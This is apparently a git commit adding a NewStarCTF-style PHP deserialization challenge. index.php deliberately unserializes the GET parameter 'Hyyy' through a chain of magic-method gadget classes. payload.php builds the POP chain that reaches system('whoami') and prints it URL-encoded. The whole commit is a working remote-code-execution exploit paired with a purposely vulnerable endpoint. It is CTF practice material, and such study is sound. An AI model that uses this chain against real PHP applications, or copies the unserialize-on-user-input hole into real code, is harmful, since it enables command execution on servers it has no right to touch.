d87eb9356fe399895ba61a9b5e932fa9bf9a995a
unknown <3027811043@qq.com>
2024-11-15 15:11:07 +0800

    上传一道ctf的php反序列化的pop链题目

---
+++ serialize_php/Unser_high/index.php
@@ -0,0 +1,71 @@
+<?php
+highlight_file(__FILE__);
+
+class Begin{
+    public $name;
+
+    public function __destruct()               
+    {
+        if(preg_match("/[a-zA-Z0-9]/",$this->name)){      
+            echo "Hello";
+        }else{
+            echo "Welcome to NewStarCTF 2023!";
+        }
+    }
+}
+
+class Then{
+    private $func;
+
+    public function __toString()       
+    {
+        ($this->func)();     
+    }
+
+}
+
+class Handle{
+    protected $obj;
+
+    public function __call($func, $vars) 
+    {
+        $this->obj->end();               
+    }
+
+}
+
+class Super{
+    protected $obj;
+    public function __invoke()      
+    {
+        $this->obj->getStr();         
+    }
+
+    public function end()
+    {
+        die("==GAME OVER==");
+    }
+}
+
+class CTF{
+    public $handle;                     
+
+    public function end()                 
+    {
+        unset($this->handle->log);     
+    }
+
+}
+
+class WhiteGod{
+    public $func;
+    public $var;
+
+    public function __unset($var)         
+    {
+        ($this->func)($this->var);       
+    }
+}
+
+@unserialize($_GET['Hyyy']);	
+?>
---
+++ serialize_php/Unser_high/payload.php
@@ -0,0 +1,39 @@
+<?php
+class Begin{
+    public $name;
+}
+
+class Then{
+    private $func;
+    public function __construct(){
+        $this->func = new Super();
+    }
+}
+
+class Handle{
+    protected $obj;
+    public function __construct(){
+        $this->obj = new CTF();
+    }           
+}
+
+class Super{
+    protected $obj;
+    public function __construct(){
+        $this->obj = new Handle();
+    }        
+}
+class CTF{
+    public $handle;
+    public function __construct(){
+        $this->handle = new WhiteGod();
+    }
+}
+
+class WhiteGod{
+    public $func="system";
+    public $var="whoami";
+}
+$begin = new begin();
+$begin ->name = new Then();
+echo urlencode(serialize($begin));
